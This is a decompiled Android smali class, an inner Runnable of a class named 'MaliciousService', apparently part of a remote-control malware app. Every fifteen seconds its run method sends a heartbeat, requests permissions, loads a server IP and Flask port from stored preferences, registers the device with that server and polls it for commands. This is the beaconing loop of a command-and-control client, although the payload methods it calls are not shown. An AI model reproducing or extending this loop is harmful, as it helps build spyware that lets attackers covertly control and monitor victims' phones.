.class Lcom/example/android/MaliciousService$3;
.super Ljava/lang/Object;
.source "MaliciousService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/android/MaliciousService;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/android/MaliciousService;


# direct methods
.method public static synthetic $r8$lambda$BlaFjZATW7S_Xkx9KDCoHtqDZ-I(Lcom/example/android/MaliciousService$3;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService$3;->lambda$run$0()V

    return-void
.end method

.method public static synthetic $r8$lambda$EfLxXSvcvfg4Y_KLFECiiTc8ZEc(Lcom/example/android/MaliciousService$3;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService$3;->lambda$run$1()V

    return-void
.end method

.method constructor <init>(Lcom/example/android/MaliciousService;)V
    .registers 2

    .line 130
    iput-object p1, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private synthetic lambda$run$0()V
    .registers 2

    .line 134
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$msendHeartbeat(Lcom/example/android/MaliciousService;)V

    return-void
.end method

.method private synthetic lambda$run$1()V
    .registers 2

    .line 141
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mcheckCommands(Lcom/example/android/MaliciousService;)V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 4

    .line 133
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetuniqueDeviceId(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_9f

    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetuniqueDeviceId(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_9f

    .line 134
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetexecutorService(Lcom/example/android/MaliciousService;)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lcom/example/android/MaliciousService$3$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/example/android/MaliciousService$3$$ExternalSyntheticLambda0;-><init>(Lcom/example/android/MaliciousService$3;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    .line 135
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mcheckAndRequestPermissions(Lcom/example/android/MaliciousService;)V

    .line 136
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mloadServerConfigFromPreferences(Lcom/example/android/MaliciousService;)V

    .line 137
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_61

    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_61

    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetFLASK_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_61

    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetFLASK_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_61

    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mallPermissionsGranted(Lcom/example/android/MaliciousService;)Z

    move-result v0

    if-eqz v0, :cond_61

    .line 138
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mregisterDeviceWithServer(Lcom/example/android/MaliciousService;)V

    .line 140
    :cond_61
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_9f

    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_9f

    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetFLASK_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_9f

    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetFLASK_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_9f

    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mallPermissionsGranted(Lcom/example/android/MaliciousService;)Z

    move-result v0

    if-eqz v0, :cond_9f

    .line 141
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetexecutorService(Lcom/example/android/MaliciousService;)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lcom/example/android/MaliciousService$3$$ExternalSyntheticLambda1;

    invoke-direct {v1, p0}, Lcom/example/android/MaliciousService$3$$ExternalSyntheticLambda1;-><init>(Lcom/example/android/MaliciousService$3;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    .line 144
    :cond_9f
    iget-object v0, p0, Lcom/example/android/MaliciousService$3;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgethandler(Lcom/example/android/MaliciousService;)Landroid/os/Handler;

    move-result-object v0

    const-string v1, "15000"

    invoke-static {v1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v1

    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 145
    return-void
.end method
